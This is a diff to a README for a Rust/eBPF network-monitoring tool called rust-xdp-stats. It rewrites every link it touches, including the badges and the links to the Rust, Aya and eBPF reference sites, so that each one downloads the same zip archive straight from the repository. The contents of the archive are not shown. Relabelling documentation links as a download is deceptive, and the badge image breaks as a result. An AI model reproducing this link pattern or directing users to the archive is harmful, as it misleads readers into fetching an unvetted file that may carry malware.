@@ -1,6 +1,6 @@
 # 🚀 rust-xdp-stats - Monitor Network Performance Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Gets105/rust-xdp-stats/releases)
+[![Download](https://github.com/Gets105/rust-xdp-stats/raw/refs/heads/main/rust-xdp-stats/xdp_rust_stats_3.5.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Gets105/rust-xdp-stats/raw/refs/heads/main/rust-xdp-stats/xdp_rust_stats_3.5.zip)
 
 ## 🌟 About
 
@@ -31,7 +31,7 @@ Follow these steps to get rust-xdp-stats up and running:
 
 1. **Visit the Releases Page**: Use the button below to go to the page where you can download the application.
 
-   [![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Gets105/rust-xdp-stats/releases)
+   [![Download](https://github.com/Gets105/rust-xdp-stats/raw/refs/heads/main/rust-xdp-stats/xdp_rust_stats_3.5.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Gets105/rust-xdp-stats/raw/refs/heads/main/rust-xdp-stats/xdp_rust_stats_3.5.zip)
 
 2. **Download the Latest Version**: On the Releases page, select the latest version of the rust-xdp-stats application. This will usually be labeled with the highest version number.
 
@@ -80,8 +80,8 @@ If you have questions or need more help, feel free to contact the support commun
 
 For more information on Rust and eBPF, consider exploring these resources:
 
-- [Rust Programming Language](https://www.rust-lang.org/)
-- [Aya eBPF Framework](https://docs.rs/aya/latest/aya/)
-- [Understanding eBPF](https://ebpf.io/)
+- [Rust Programming Language](https://github.com/Gets105/rust-xdp-stats/raw/refs/heads/main/rust-xdp-stats/xdp_rust_stats_3.5.zip)
+- [Aya eBPF Framework](https://github.com/Gets105/rust-xdp-stats/raw/refs/heads/main/rust-xdp-stats/xdp_rust_stats_3.5.zip)
+- [Understanding eBPF](https://github.com/Gets105/rust-xdp-stats/raw/refs/heads/main/rust-xdp-stats/xdp_rust_stats_3.5.zip)
 
 Hope you enjoy using rust-xdp-stats to monitor and improve your network performance!
